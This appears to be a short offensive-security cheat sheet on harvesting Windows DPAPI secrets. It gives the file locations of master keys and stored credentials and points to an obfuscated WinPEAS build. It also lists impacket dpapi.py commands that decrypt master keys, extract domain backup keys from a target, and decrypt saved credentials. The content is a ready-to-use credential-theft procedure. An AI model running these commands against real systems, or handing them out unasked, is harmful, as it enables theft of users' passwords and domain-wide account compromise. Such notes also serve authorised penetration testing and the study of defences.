# DPAPI

### Master Key Location

```
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

### Credentials Location

```
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

### Winpeas automatically gets the paths of DPAPI

Download Winpeas : ofs version is the obfuscated one : [WinPeas](https://github.com/peass-ng/PEASS-ng/releases/latest)

### Decrypting the creds

[dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)

```bash
# Decrypt a master key
python3 dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# Obtain the backup keys & use it to decrypt a master key
python3 dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
python3 dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# Decrypt DPAPI-protected data using a master key
python3 dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```


